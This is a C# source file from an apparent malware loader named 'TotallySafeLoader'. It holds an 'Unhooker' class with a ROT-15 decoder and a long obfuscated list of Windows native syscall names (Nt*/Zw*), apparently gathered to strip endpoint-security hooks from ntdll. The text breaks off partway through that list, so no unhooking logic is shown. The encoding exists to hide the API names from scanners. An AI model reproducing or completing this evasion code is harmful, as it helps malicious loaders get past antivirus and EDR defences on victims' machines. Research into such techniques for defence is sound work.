﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using DI = XYZ.DI;

namespace TotallySafeLoader
{
    internal class Unhooker
    {
        private static string rot(string value)
        {
            string alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            int shift = 15;
            StringBuilder sb = new StringBuilder();
            foreach (char c in value)
            {
                int idx = alpha.IndexOf(c);
                if (idx == -1)
                {
                    sb.Append(c);
                    continue;
                }
                idx += shift;
                idx %= alpha.Length;
                sb.Append(alpha[idx]);
            }
            return sb.ToString();
        }

        private static string[] functions =
        {
            "yelNNPaenZYYPNeAZce",
            "yelNNPddnSPNV",
            "yelNNPddnSPNVlYOlfOTelWLcX",
            "yelNNPddnSPNVmjEjaP",
            "yelNNPddnSPNVmjEjaPlYOlfOTelWLcX",
            "yelNNPddnSPNVmjEjaPCPdfWewTde",
            "yelNNPddnSPNVmjEjaPCPdfWewTdelYOlfOTelWLcX",
            "yelNNPddnSPNVmjEjaPCPdfWewTdelYOlfOTelWLcXmjsLYOWP",
            "yelOOleZX",
            "yelOOleZXpi",
            "yelOOmZZepYecj",
            "yelOOocTgPcpYecj",
            "yelOUfdercZfadEZVPY",
            "yelOUfdeAcTgTWPRPdEZVPY",
            "yelOUfdeEZVPYnWLTXdlYOoPgTNPrcZfad",
            "yelWPceCPdfXPEScPLO",
            "yelWPceEScPLO",
            "yelWPceEScPLOmjEScPLOtO",
            "yelWWZNLePwZNLWWjFYTbfPtO",
            "yelWWZNLePCPdPcgPzMUPNe",
            "yelWWZNLePFdPcASjdTNLWALRPd",
            "yelWWZNLePFfTOd",
            "yelWWZNLePGTcefLWxPXZcj",
            "yelWaNlNNPaenZYYPNeAZce",
            "yelWaNnLYNPWxPddLRP",
            "yelWaNnZYYPNeAZce",
            "yelWaNnZYYPNeAZcepi",
            "yelWaNncPLePAZce",
            "yelWaNncPLePAZceDPNeTZY",
            "yelWaNncPLePCPdZfcNPCPdPcgP",
            "yelWaNncPLePDPNeTZYGTPh",
            "yelWaNncPLePDPNfcTejnZYePie",
            "yelWaNoPWPePAZceDPNeTZY",
            "yelWaNoPWPePCPdZfcNPCPdPcgP",
            "yelWaNoPWPePDPNeTZYGTPh",
            "yelWaNoPWPePDPNfcTejnZYePie",
            "yelWaNoTdNZYYPNeAZce",
            "yelWaNtXaPcdZYLePnWTPYenZYeLTYPczQAZce",
            "yelWaNtXaPcdZYLePnWTPYezQAZce",
            "yelWaNzaPYDPYOPcAcZNPdd",
            "yelWaNzaPYDPYOPcEScPLO",
            "yelWaNBfPcjtYQZcXLeTZY",
            "yelWaNBfPcjtYQZcXLeTZYxPddLRP",
            "yelWaNCPgZVPDPNfcTejnZYePie",
            "yelWaNDPYOHLTeCPNPTgPAZce",
            "yelWaNDPetYQZcXLeTZY",
            "yelaaSPWanLNSPnZYecZW",
            "yelcPxLaaPOqTWPdESPDLXP",
            "yelddTRYAcZNPddEZuZMzMUPNe",
            "yelddZNTLePHLTenZXaWPeTZYALNVPe",
            "yenLWWMLNVCPefcY",
            "yenLYNPWtZqTWP",
            "yenLYNPWtZqTWPpi",
            "yenLYNPWDjYNScZYZfdtZqTWP",
            "yenLYNPWETXPc",
            "yenLYNPWETXPc2",
            "yenLYNPWHLTenZXaWPeTZYALNVPe",
            "yenWPLcpgPYe",
            "yenWZdP",
            "yenWZdPzMUPNelfOTelWLcX",
            "yenZXXTenZXaWPeP",
            "yenZXXTepYWTdeXPYe",
            "yenZXXTeCPRTdecjEcLYdLNeTZY",
            "yenZXXTeEcLYdLNeTZY",
            "yenZXaLNevPjd",
            "yenZXaLcPzMUPNed",
            "yenZXaLcPEZVPYd",
            "yenZXaWPePnZYYPNeAZce",
            "yenZXacPddvPj",
            "yenZYYPNeAZce",
            "yenZYeTYfP",
            "yencPLePoPMfRzMUPNe",
            "yencPLePoTcPNeZcjzMUPNe",
            "yencPLePoTcPNeZcjzMUPNepi",
            "yencPLePpYNWLgP",
            "yencPLePpYWTdeXPYe",
            "yencPLePpgPYe",
            "yencPLePpgPYeALTc",
            "yencPLePqTWP",
            "yencPLePtCETXPc",
            "yencPLePtZnZXaWPeTZY",
            "yencPLePuZMzMUPNe",
            "yencPLePuZMDPe",
            "yencPLePvPj",
            "yencPLePvPjEcLYdLNePO",
            "yencPLePvPjPOpgPYe",
            "yencPLePwZhmZiEZVPY",
            "yencPLePxLTWdWZeqTWP",
            "yencPLePxfeLYe",
            "yencPLePyLXPOATaPqTWP",
            "yencPLePALRTYRqTWP",
            "yencPLePALceTeTZY",
            "yencPLePAZce",
            "yencPLePAcTgLePyLXPdaLNP",
            "yencPLePAcZNPdd",
            "yencPLePAcZNPddpi",
            "yencPLePAcZQTWP",
            "yencPLePAcZQTWPpi",
            "yencPLePCPRTdecjEcLYdLNeTZY",
            "yencPLePCPdZfcNPxLYLRPc",
            "yencPLePDPNeTZY",
            "yencPLePDPXLaSZcP",
            "yencPLePDjXMZWTNwTYVzMUPNe",
            "yencPLePEScPLO",
            "yencPLePEScPLOpi",
            "yencPLePETXPc",
            "yencPLePETXPc2",
            "yencPLePEZVPY",
            "yencPLePEZVPYpi",
            "yencPLePEcLYdLNeTZY",
            "yencPLePEcLYdLNeTZYxLYLRPc",
            "yencPLePFdPcAcZNPdd",
            "yencPLePHLTenZXaWPeTZYALNVPe",
            "yencPLePHLTeLMWPAZce",
            "yencPLePHYQDeLePyLXP",
            "yencPLePHZcVPcqLNeZcj",
            "yeoPMfRlNeTgPAcZNPdd",
            "yeoPMfRnZYeTYfP",
            "yeoPWLjpiPNfeTZY",
            "yeoPWPePleZX",
            "yeoPWPePmZZepYecj",
            "yeoPWPePocTgPcpYecj",
            "yeoPWPePqTWP",
            "yeoPWPePvPj",
            "yeoPWPePzMUPNelfOTelWLcX",
            "yeoPWPePAcTgLePyLXPdaLNP",
            "yeoPWPePGLWfPvPj",
            "yeoPWPePHYQDeLePoLeL",
            "yeoPWPePHYQDeLePyLXP",
            "yeoPgTNPtZnZYecZWqTWP",
            "yeoTdLMWPwLdevYZhYrZZO",
            "yeoTdaWLjDecTYR",
            "yeocLhEPie",
            "yeofaWTNLePzMUPNe",
            "yeofaWTNLePEZVPY",
            "yepYLMWPwLdevYZhYrZZO",
            "yepYfXPcLePmZZepYecTPd",
            "yepYfXPcLePocTgPcpYecTPd",
            "yepYfXPcLePvPj",
            "yepYfXPcLePDjdePXpYgTcZYXPYeGLWfPdpi",
            "yepYfXPcLePEcLYdLNeTZYzMUPNe",
            "yepYfXPcLePGLWfPvPj",
            "yepiePYODPNeTZY",
            "yeqTWePcmZZezaeTZY",
            "yeqTWePcEZVPY",
            "yeqTWePcEZVPYpi",
            "yeqTYOleZX",
            "yeqWfdSmfQQPcdqTWP",
            "yeqWfdSmfQQPcdqTWPpi",
            "yeqWfdStYdeLWWFtwLYRfLRP",
            "yeqWfdStYdecfNeTZYnLNSP",
            "yeqWfdSvPj",
            "yeqWfdSAcZNPddHcTePmfQQPcd",
            "yeqWfdSGTcefLWxPXZcj",
            "yeqWfdSHcTePmfQQPc",
            "yeqcPPFdPcASjdTNLWALRPd",
            "yeqcPPGTcefLWxPXZcj",
            "yeqcPPkPCPRTdecj",
            "yeqcPPkPEcLYdLNeTZYd",
            "yeqdnZYecZWqTWP",
            "yerPenLNSPODTRYTYRwPgPW",
            "yerPenZXaWPePHYQDeLePDfMdNcTaeTZY",
            "yerPenZYePieEScPLO",
            "yerPenfccPYeAcZNPddZcyfXMPc",
            "yerPenfccPYeAcZNPddZcyfXMPcpi",
            "yerPeoPgTNPAZhPcDeLeP",
            "yerPexFtCPRTdecjtYQZ",
            "yerPeyPieAcZNPdd",
            "yerPeyPieEScPLO",
            "yerPeyWdDPNeTZYAec",
            "yerPeyZeTQTNLeTZYCPdZfcNPxLYLRPc",
            "yerPeHcTePHLeNS",
            "yetXaPcdZYLePlYZYjXZfdEZVPY",
            "yetXaPcdZYLePnWTPYezQAZce",
            "yetXaPcdZYLePEScPLO",
            "yetYTeTLWTkPpYNWLgP",
            "yetYTeTLWTkPyWdqTWPd",
            "yetYTeTLWTkPCPRTdecj",
            "yetYTeTLePAZhPclNeTZY",
            "yetdAcZNPddtYuZM",
            "yetdDjdePXCPdfXPlfeZXLeTN",
            "yetdFtwLYRfLRPnZXTeePO",
            "yewTdePYAZce",
            "yewZLOocTgPc",
            "yewZLOpYNWLgPoLeL",
            "yewZLOvPj",
            "yewZLOvPj2",
            "yewZLOvPj3",
            "yewZLOvPjpi",
            "yewZNVqTWP",
            "yewZNVAcZOfNelNeTgLeTZYvPjd",
            "yewZNVCPRTdecjvPj",
            "yewZNVGTcefLWxPXZcj",
            "yexLVPAPcXLYPYezMUPNe",
            "yexLVPEPXaZcLcjzMUPNe",
            "yexLYLRPALceTeTZY",
            "yexLanxqxZOfWP",
            "yexLaFdPcASjdTNLWALRPd",
            "yexLaFdPcASjdTNLWALRPdDNLeePc",
            "yexLaGTPhzQDPNeTZY",
            "yexZOTQjmZZepYecj",
            "yexZOTQjocTgPcpYecj",
            "yeyZeTQjnSLYRPoTcPNeZcjqTWP",
            "yeyZeTQjnSLYRPvPj",
            "yeyZeTQjnSLYRPxfWeTaWPvPjd",
            "yeyZeTQjnSLYRPDPddTZY",
            "yezaPYoTcPNeZcjzMUPNe",
            "yezaPYpYWTdeXPYe",
            "yezaPYpgPYe",
            "yezaPYpgPYeALTc",
            "yezaPYqTWP",
            "yezaPYtZnZXaWPeTZY",
            "yezaPYuZMzMUPNe",
            "yezaPYvPj",
            "yezaPYvPjpi",
            "yezaPYvPjEcLYdLNePO",
            "yezaPYvPjEcLYdLNePOpi",
            "yezaPYvPjPOpgPYe",
            "yezaPYxfeLYe",
            "yezaPYzMUPNelfOTelWLcX",
            "yezaPYALceTeTZY",
            "yezaPYAcTgLePyLXPdaLNP",
            "yezaPYAcZNPdd",
            "yezaPYAcZNPddEZVPY",
            "yezaPYAcZNPddEZVPYpi",
            "yezaPYCPRTdecjEcLYdLNeTZY",
            "yezaPYCPdZfcNPxLYLRPc",
            "yezaPYDPNeTZY",
            "yezaPYDPXLaSZcP",
            "yezaPYDPddTZY",
            "yezaPYDjXMZWTNwTYVzMUPNe",
            "yezaPYEScPLO",
            "yezaPYEScPLOEZVPY",
            "yezaPYEScPLOEZVPYpi",
            "yezaPYETXPc",
            "yezaPYEcLYdLNeTZY",
            "yezaPYEcLYdLNeTZYxLYLRPc",
            "yeAWfRAWLjnZYecZW",
            "yeAZhPctYQZcXLeTZY",
            "yeAcPAcPaLcPnZXaWPeP",
            "yeAcPAcPaLcPpYWTdeXPYe",
            "yeAcPaLcPnZXaWPeP",
            "yeAcPaLcPpYWTdeXPYe",
            "yeAcTgTWPRPnSPNV",
            "yeAcTgTWPRPzMUPNelfOTelWLcX",
            "yeAcTgTWPRPODPcgTNPlfOTelWLcX",
            "yeAcZaLRLeTZYnZXaWPeP",
            "yeAcZaLRLeTZYqLTWPO",
            "yeAcZePNeGTcefLWxPXZcj",
            "yeAfWdPpgPYe",
            "yeBfPcjleecTMfePdqTWP",
            "yeBfPcjmZZepYecjzcOPc",
            "yeBfPcjmZZezaeTZYd",
            "yeBfPcjoPMfRqTWePcDeLeP",
            "yeBfPcjoPQLfWewZNLWP",
            "yeBfPcjoPQLfWeFtwLYRfLRP",
            "yeBfPcjoTcPNeZcjqTWP",
            "yeBfPcjoTcPNeZcjzMUPNe",
            "yeBfPcjocTgPcpYecjzcOPc",
            "yeBfPcjpLqTWP",
            "yeBfPcjpgPYe",
            "yeBfPcjqfWWleecTMfePdqTWP",
            "yeBfPcjtYQZcXLeTZYleZX",
            "yeBfPcjtYQZcXLeTZYpYWTdeXPYe",
            "yeBfPcjtYQZcXLeTZYqTWP",
            "yeBfPcjtYQZcXLeTZYuZMzMUPNe",
            "yeBfPcjtYQZcXLeTZYAZce",
            "yeBfPcjtYQZcXLeTZYAcZNPdd",
            "yeBfPcjtYQZcXLeTZYCPdZfcNPxLYLRPc",
            "yeBfPcjtYQZcXLeTZYEScPLO",
            "yeBfPcjtYQZcXLeTZYEZVPY",
            "yeBfPcjtYQZcXLeTZYEcLYdLNeTZY",
            "yeBfPcjtYQZcXLeTZYEcLYdLNeTZYxLYLRPc",
            "yeBfPcjtYQZcXLeTZYHZcVPcqLNeZcj",
            "yeBfPcjtYdeLWWFtwLYRfLRP",
            "yeBfPcjtYePcgLWAcZQTWP",
            "yeBfPcjtZnZXaWPeTZY",
            "yeBfPcjvPj",
            "yeBfPcjwTNPYdPGLWfP",
            "yeBfPcjxfWeTaWPGLWfPvPj",
            "yeBfPcjxfeLYe",
            "yeBfPcjzMUPNe",
            "yeBfPcjzaPYDfMvPjd",
            "yeBfPcjzaPYDfMvPjdpi",
            "yeBfPcjAPcQZcXLYNPnZfYePc",
            "yeBfPcjAZcetYQZcXLeTZYAcZNPdd",
            "yeBfPcjBfZeLtYQZcXLeTZYqTWP",
            "yeBfPcjDPNeTZY",
            "yeBfPcjDPNfcTejleecTMfePdEZVPY",
            "yeBfPcjDPNfcTejzMUPNe",
            "yeBfPcjDPNfcTejAZWTNj",
            "yeBfPcjDPXLaSZcP",
            "yeBfPcjDjXMZWTNwTYVzMUPNe",
            "yeBfPcjDjdePXpYgTcZYXPYeGLWfP",
            "yeBfPcjDjdePXpYgTcZYXPYeGLWfPpi",
            "yeBfPcjDjdePXtYQZcXLeTZY",
            "yeBfPcjDjdePXtYQZcXLeTZYpi",
            "yeBfPcjETXPc",
            "yeBfPcjETXPcCPdZWfeTZY",
            "yeBfPcjGLWfPvPj",
            "yeBfPcjGTcefLWxPXZcj",
            "yeBfPcjGZWfXPtYQZcXLeTZYqTWP",
            "yeBfPcjHYQDeLePoLeL",
            "yeBfPcjHYQDeLePyLXPtYQZcXLeTZY",
            "yeBfPfPlaNEScPLO",
            "yeBfPfPlaNEScPLOpi",
            "yeCLTdPpiNPaeTZY",
            "yeCLTdPsLcOpccZc",
            "yeCPLOqTWP",
            "yeCPLOqTWPDNLeePc",
            "yeCPLOzYWjpYWTdeXPYe",
            "yeCPLOCPbfPdeoLeL",
            "yeCPLOGTcefLWxPXZcj",
            "yeCPNZgPcpYWTdeXPYe",
            "yeCPNZgPcCPdZfcNPxLYLRPc",
            "yeCPNZgPcEcLYdLNeTZYxLYLRPc",
            "yeCPRTdePcAcZeZNZWlOOcPddtYQZcXLeTZY",
            "yeCPRTdePcEScPLOEPcXTYLePAZce",
            "yeCPWPLdPvPjPOpgPYe",
            "yeCPWPLdPxfeLYe",
            "yeCPWPLdPDPXLaSZcP",
            "yeCPWPLdPHZcVPcqLNeZcjHZcVPc",
            "yeCPXZgPtZnZXaWPeTZY",
            "yeCPXZgPtZnZXaWPeTZYpi",
            "yeCPXZgPAcZNPddoPMfR",
            "yeCPYLXPvPj",
            "yeCPYLXPEcLYdLNeTZYxLYLRPc",
            "yeCPaWLNPvPj",
            "yeCPaWLNPALceTeTZYFYTe",
            "yeCPaWjAZce",
            "yeCPaWjHLTeCPNPTgPAZce",
            "yeCPaWjHLTeCPNPTgPAZcepi",
            "yeCPaWjHLTeCPaWjAZce",
            "yeCPbfPdeAZce",
            "yeCPbfPdeHLTeCPaWjAZce",
            "yeCPdPepgPYe",
            "yeCPdPeHcTePHLeNS",
            "yeCPdeZcPvPj",
            "yeCPdfXPAcZNPdd",
            "yeCPdfXPEScPLO",
            "yeCPgPcenZYeLTYPctXaPcdZYLeTZY",
            "yeCZWWMLNVnZXaWPeP",
            "yeCZWWMLNVpYWTdeXPYe",
            "yeCZWWMLNVCPRTdecjEcLYdLNeTZY",
            "yeCZWWMLNVEcLYdLNeTZY",
            "yeCZWWQZchLcOEcLYdLNeTZYxLYLRPc",
            "yeDLgPvPj",
            "yeDLgPvPjpi",
            "yeDLgPxPcRPOvPjd",
            "yeDPNfcPnZYYPNeAZce",
            "yeDPcTLWTkPmZZe",
            "yeDPemZZepYecjzcOPc",
            "yeDPemZZezaeTZYd",
            "yeDPenLNSPODTRYTYRwPgPW",
            "yeDPenLNSPODTRYTYRwPgPW2",
            "yeDPenZYePieEScPLO",
            "yeDPeoPMfRqTWePcDeLeP",
            "yeDPeoPQLfWesLcOpccZcAZce",
            "yeDPeoPQLfWewZNLWP",
            "yeDPeoPQLfWeFtwLYRfLRP",
            "yeDPeocTgPcpYecjzcOPc",
            "yeDPepLqTWP",
            "yeDPepgPYe",
            "yeDPepgPYemZZdeAcTZcTej",
            "yeDPesTRSpgPYeALTc",
            "yeDPesTRSHLTewZhpgPYeALTc",
            "yeDPetCETXPc",
            "yeDPetYQZcXLeTZYoPMfRzMUPNe",
            "yeDPetYQZcXLeTZYpYWTdeXPYe",
            "yeDPetYQZcXLeTZYqTWP",
            "yeDPetYQZcXLeTZYuZMzMUPNe",
            "yeDPetYQZcXLeTZYvPj",
            "yeDPetYQZcXLeTZYzMUPNe",
            "yeDPetYQZcXLeTZYAcZNPdd",
            "yeDPetYQZcXLeTZYCPdZfcNPxLYLRPc",
            "yeDPetYQZcXLeTZYDjXMZWTNwTYV",
            "yeDPetYQZcXLeTZYEScPLO",
            "yeDPetYQZcXLeTZYEZVPY",
            "yeDPetYQZcXLeTZYEcLYdLNeTZY",
            "yeDPetYQZcXLeTZYEcLYdLNeTZYxLYLRPc",
            "yeDPetYQZcXLeTZYGTcefLWxPXZcj",
            "yeDPetYQZcXLeTZYHZcVPcqLNeZcj",
            "yeDPetYePcgLWAcZQTWP",
            "yeDPetZnZXaWPeTZY",
            "yeDPetZnZXaWPeTZYpi",
            "yeDPewOepYecTPd",
            "yeDPewZhpgPYeALTc",
            "yeDPewZhHLTesTRSpgPYeALTc",
            "yeDPeBfZeLtYQZcXLeTZYqTWP",
            "yeDPeDPNfcTejzMUPNe",
            "yeDPeDjdePXpYgTcZYXPYeGLWfP",
            "yeDPeDjdePXpYgTcZYXPYeGLWfPpi",
            "yeDPeDjdePXtYQZcXLeTZY",
            "yeDPeDjdePXAZhPcDeLeP",
            "yeDPeDjdePXETXP",
            "yeDPeEScPLOpiPNfeTZYDeLeP",
            "yeDPeETXPc",
            "yeDPeETXPc2",
            "yeDPeETXPcpi",
            "yeDPeETXPcCPdZWfeTZY",
            "yeDPeFfTODPPO",
            "yeDPeGLWfPvPj",
            "yeDPeGZWfXPtYQZcXLeTZYqTWP",
            "yeDPeHYQAcZNPddyZeTQTNLeTZYpgPYe",
            "yeDSfeOZhYDjdePX",
            "yeDSfeOZhYHZcVPcqLNeZcj",
            "yeDTRYLWlYOHLTeqZcDTYRWPzMUPNe",
            "yeDTYRWPASLdPCPUPNe",
            "yeDeLceAcZQTWP",
            "yeDeZaAcZQTWP",
            "yeDfMdNcTMPHYQDeLePnSLYRP",
            "yeDfdaPYOAcZNPdd",
            "yeDfdaPYOEScPLO",
            "yeDjdePXoPMfRnZYecZW",
            "yeEPcXTYLePuZMzMUPNe",
            "yeEPcXTYLePAcZNPdd",
            "yeEPcXTYLePEScPLO",
            "yeEPdelWPce",
            "yeESLhCPRTdecj",
            "yeESLhEcLYdLNeTZYd",
            "yeEcLNPnZYecZW",
            "yeEcLNPpgPYe",
            "yeEcLYdWLePqTWPALeS",
            "yeFXdEScPLOJTPWO",
            "yeFYWZLOocTgPc",
            "yeFYWZLOvPj",
            "yeFYWZLOvPj2",
            "yeFYWZLOvPjpi",
            "yeFYWZNVqTWP",
            "yeFYWZNVGTcefLWxPXZcj",
            "yeFYXLaGTPhzQDPNeTZY",
            "yeFYXLaGTPhzQDPNeTZYpi",
            "yeFYdfMdNcTMPHYQDeLePnSLYRP",
            "yeFaOLePHYQDeLePoLeL",
            "yeGOXnZYecZW",
            "yeHLTeqZclWPcemjEScPLOtO",
            "yeHLTeqZcoPMfRpgPYe",
            "yeHLTeqZcvPjPOpgPYe",
            "yeHLTeqZcxfWeTaWPzMUPNed",
            "yeHLTeqZcxfWeTaWPzMUPNed32",
            "yeHLTeqZcDTYRWPzMUPNe",
            "yeHLTeqZcHZcVGTLHZcVPcqLNeZcj",
            "yeHLTesTRSpgPYeALTc",
            "yeHLTewZhpgPYeALTc",
            "yeHZcVPcqLNeZcjHZcVPcCPLOj",
            "yeHcTePqTWP",
            "yeHcTePqTWPrLeSPc",
            "yeHcTePCPbfPdeoLeL",
            "yeHcTePGTcefLWxPXZcj",
            "yeJTPWOpiPNfeTZY",
            "KhlNNPaenZYYPNeAZce",
            "KhlNNPddnSPNV",
            "KhlNNPddnSPNVlYOlfOTelWLcX",
            "KhlNNPddnSPNVmjEjaP",
            "KhlNNPddnSPNVmjEjaPlYOlfOTelWLcX",
            "KhlNNPddnSPNVmjEjaPCPdfWewTde",
            "KhlNNPddnSPNVmjEjaPCPdfWewTdelYOlfOTelWLcX",
            "KhlNNPddnSPNVmjEjaPCPdfWewTdelYOlfOTelWLcXmjsLYOWP",
            "KhlOOleZX",
            "KhlOOleZXpi",
            "KhlOOmZZepYecj",
            "KhlOOocTgPcpYecj",
            "KhlOUfdercZfadEZVPY",
            "KhlOUfdeAcTgTWPRPdEZVPY",
            "KhlOUfdeEZVPYnWLTXdlYOoPgTNPrcZfad",
            "KhlWPceCPdfXPEScPLO",
            "KhlWPceEScPLO",
            "KhlWPceEScPLOmjEScPLOtO",
            "KhlWWZNLePwZNLWWjFYTbfPtO",
            "KhlWWZNLePCPdPcgPzMUPNe",
            "KhlWWZNLePFdPcASjdTNLWALRPd",
            "KhlWWZNLePFfTOd",
            "KhlWWZNLePGTcefLWxPXZcj",
            "KhlWaNlNNPaenZYYPNeAZce",
            "KhlWaNnLYNPWxPddLRP",
            "KhlWaNnZYYPNeAZce",
            "KhlWaNnZYYPNeAZcepi",
            "KhlWaNncPLePAZce",
            "KhlWaNncPLePAZceDPNeTZY",
            "KhlWaNncPLePCPdZfcNPCPdPcgP",
            "KhlWaNncPLePDPNeTZYGTPh",
            "KhlWaNncPLePDPNfcTejnZYePie",
            "KhlWaNoPWPePAZceDPNeTZY",
            "KhlWaNoPWPePCPdZfcNPCPdPcgP",
            "KhlWaNoPWPePDPNeTZYGTPh",
            "KhlWaNoPWPePDPNfcTejnZYePie",
            "KhlWaNoTdNZYYPNeAZce",
            "KhlWaNtXaPcdZYLePnWTPYenZYeLTYPczQAZce",
            "KhlWaNtXaPcdZYLePnWTPYezQAZce",
            "KhlWaNzaPYDPYOPcAcZNPdd",
            "KhlWaNzaPYDPYOPcEScPLO",
            "KhlWaNBfPcjtYQZcXLeTZY",
            "KhlWaNBfPcjtYQZcXLeTZYxPddLRP",
            "KhlWaNCPgZVPDPNfcTejnZYePie",
            "KhlWaNDPYOHLTeCPNPTgPAZce",
            "KhlWaNDPetYQZcXLeTZY",
            "KhlaaSPWanLNSPnZYecZW",
            "KhlcPxLaaPOqTWPdESPDLXP",
            "KhlddTRYAcZNPddEZuZMzMUPNe",
            "KhlddZNTLePHLTenZXaWPeTZYALNVPe",
            "KhnLWWMLNVCPefcY",
            "KhnLYNPWtZqTWP",
            "KhnLYNPWtZqTWPpi",
            "KhnLYNPWDjYNScZYZfdtZqTWP",
            "KhnLYNPWETXPc",
            "KhnLYNPWETXPc2",
            "KhnLYNPWHLTenZXaWPeTZYALNVPe",
            "KhnWPLcpgPYe",
            "KhnWZdP",
            "KhnWZdPzMUPNelfOTelWLcX",
            "KhnZXXTenZXaWPeP",
            "KhnZXXTepYWTdeXPYe",
            "KhnZXXTeCPRTdecjEcLYdLNeTZY",
            "KhnZXXTeEcLYdLNeTZY",
            "KhnZXaLNevPjd",
            "KhnZXaLcPzMUPNed",
            "KhnZXaLcPEZVPYd",
            "KhnZXaWPePnZYYPNeAZce",
            "KhnZXacPddvPj",
            "KhnZYYPNeAZce",
            "KhnZYeTYfP",
            "KhncPLePoPMfRzMUPNe",
            "KhncPLePoTcPNeZcjzMUPNe",
            "KhncPLePoTcPNeZcjzMUPNepi",
            "KhncPLePpYNWLgP",
            "KhncPLePpYWTdeXPYe",
            "KhncPLePpgPYe",
            "KhncPLePpgPYeALTc",
            "KhncPLePqTWP",
            "KhncPLePtCETXPc",
            "KhncPLePtZnZXaWPeTZY",
            "KhncPLePuZMzMUPNe",
            "KhncPLePuZMDPe",
            "KhncPLePvPj",
            "KhncPLePvPjEcLYdLNePO",
            "KhncPLePvPjPOpgPYe",
            "KhncPLePwZhmZiEZVPY",
            "KhncPLePxLTWdWZeqTWP",
            "KhncPLePxfeLYe",
            "KhncPLePyLXPOATaPqTWP",
            "KhncPLePALRTYRqTWP",
            "KhncPLePALceTeTZY",
            "KhncPLePAZce",
            "KhncPLePAcTgLePyLXPdaLNP",
            "KhncPLePAcZNPdd",
            "KhncPLePAcZNPddpi",
            "KhncPLePAcZQTWP",
            "KhncPLePAcZQTWPpi",
            "KhncPLePCPRTdecjEcLYdLNeTZY",
            "KhncPLePCPdZfcNPxLYLRPc",
            "KhncPLePDPNeTZY",
            "KhncPLePDPXLaSZcP",
            "KhncPLePDjXMZWTNwTYVzMUPNe",
            "KhncPLePEScPLO",
            "KhncPLePEScPLOpi",
            "KhncPLePETXPc",
            "KhncPLePETXPc2",
            "KhncPLePEZVPY",
            "KhncPLePEZVPYpi",
            "KhncPLePEcLYdLNeTZY",
            "KhncPLePEcLYdLNeTZYxLYLRPc",
            "KhncPLePFdPcAcZNPdd",
            "KhncPLePHLTenZXaWPeTZYALNVPe",
            "KhncPLePHLTeLMWPAZce",
            "KhncPLePHYQDeLePyLXP",
            "KhncPLePHZcVPcqLNeZcj",
            "KhoPMfRlNeTgPAcZNPdd",
            "KhoPMfRnZYeTYfP",
            "KhoPWLjpiPNfeTZY",
            "KhoPWPePleZX",
            "KhoPWPePmZZepYecj",
            "KhoPWPePocTgPcpYecj",
            "KhoPWPePqTWP",
            "KhoPWPePvPj",
            "KhoPWPePzMUPNelfOTelWLcX",
            "KhoPWPePAcTgLePyLXPdaLNP",
            "KhoPWPePGLWfPvPj",
            "KhoPWPePHYQDeLePoLeL",
            "KhoPWPePHYQDeLePyLXP",
            "KhoPgTNPtZnZYecZWqTWP",
            "KhoTdLMWPwLdevYZhYrZZO",
            "KhoTdaWLjDecTYR",
            "KhocLhEPie",
            "KhofaWTNLePzMUPNe",
            "KhofaWTNLePEZVPY",
            "KhpYLMWPwLdevYZhYrZZO",
            "KhpYfXPcLePmZZepYecTPd",
            "KhpYfXPcLePocTgPcpYecTPd",
            "KhpYfXPcLePvPj",
            "KhpYfXPcLePDjdePXpYgTcZYXPYeGLWfPdpi",
            "KhpYfXPcLePEcLYdLNeTZYzMUPNe",
            "KhpYfXPcLePGLWfPvPj",
            "KhpiePYODPNeTZY",
            "KhqTWePcmZZezaeTZY",
            "KhqTWePcEZVPY",
            "KhqTWePcEZVPYpi",
            "KhqTYOleZX",
            "KhqWfdSmfQQPcdqTWP",
            "KhqWfdSmfQQPcdqTWPpi",
            "KhqWfdStYdeLWWFtwLYRfLRP",
            "KhqWfdStYdecfNeTZYnLNSP",
            "KhqWfdSvPj",
            "KhqWfdSAcZNPddHcTePmfQQPcd",
            "KhqWfdSGTcefLWxPXZcj",
            "KhqWfdSHcTePmfQQPc",
            "KhqcPPFdPcASjdTNLWALRPd",
            "KhqcPPGTcefLWxPXZcj",
            "KhqcPPkPCPRTdecj",
            "KhqcPPkPEcLYdLNeTZYd",
            "KhqdnZYecZWqTWP",
            "KhrPenLNSPODTRYTYRwPgPW",
            "KhrPenZXaWPePHYQDeLePDfMdNcTaeTZY",
            "KhrPenZYePieEScPLO",
            "KhrPenfccPYeAcZNPddZcyfXMPc",
            "KhrPenfccPYeAcZNPddZcyfXMPcpi",
            "KhrPeoPgTNPAZhPcDeLeP",
            "KhrPexFtCPRTdecjtYQZ",
            "KhrPeyPieAcZNPdd",
            "KhrPeyPieEScPLO",
            "KhrPeyWdDPNeTZYAec",
            "KhrPeyZeTQTNLeTZYCPdZfcNPxLYLRPc",
            "KhrPeHcTePHLeNS",
            "KhtXaPcdZYLePlYZYjXZfdEZVPY",
            "KhtXaPcdZYLePnWTPYezQAZce",
            "KhtXaPcdZYLePEScPLO",
            "KhtYTeTLWTkPpYNWLgP",
            "KhtYTeTLWTkPyWdqTWPd",
            "KhtYTeTLWTkPCPRTdecj",
            "KhtYTeTLePAZhPclNeTZY",
            "KhtdAcZNPddtYuZM",
            "KhtdDjdePXCPdfXPlfeZXLeTN",
            "KhtdFtwLYRfLRPnZXTeePO",
            "KhwTdePYAZce",
            "KhwZLOocTgPc",
            "KhwZLOpYNWLgPoLeL",
            "KhwZLOvPj",
            "KhwZLOvPj2",
            "KhwZLOvPj3",
            "KhwZLOvPjpi",
            "KhwZNVqTWP",
            "KhwZNVAcZOfNelNeTgLeTZYvPjd",
            "KhwZNVCPRTdecjvPj",
            "KhwZNVGTcefLWxPXZcj",
            "KhxLVPAPcXLYPYezMUPNe",
            "KhxLVPEPXaZcLcjzMUPNe",
            "KhxLYLRPALceTeTZY",
            "KhxLanxqxZOfWP",
            "KhxLaFdPcASjdTNLWALRPd",
            "KhxLaFdPcASjdTNLWALRPdDNLeePc",
            "KhxLaGTPhzQDPNeTZY",
            "KhxZOTQjmZZepYecj",
            "KhxZOTQjocTgPcpYecj",
            "KhyZeTQjnSLYRPoTcPNeZcjqTWP",
            "KhyZeTQjnSLYRPvPj",
            "KhyZeTQjnSLYRPxfWeTaWPvPjd",
            "KhyZeTQjnSLYRPDPddTZY",
            "KhzaPYoTcPNeZcjzMUPNe",
            "KhzaPYpYWTdeXPYe",
            "KhzaPYpgPYe",
            "KhzaPYpgPYeALTc",
            "KhzaPYqTWP",
            "KhzaPYtZnZXaWPeTZY",
            "KhzaPYuZMzMUPNe",
            "KhzaPYvPj",
            "KhzaPYvPjpi",
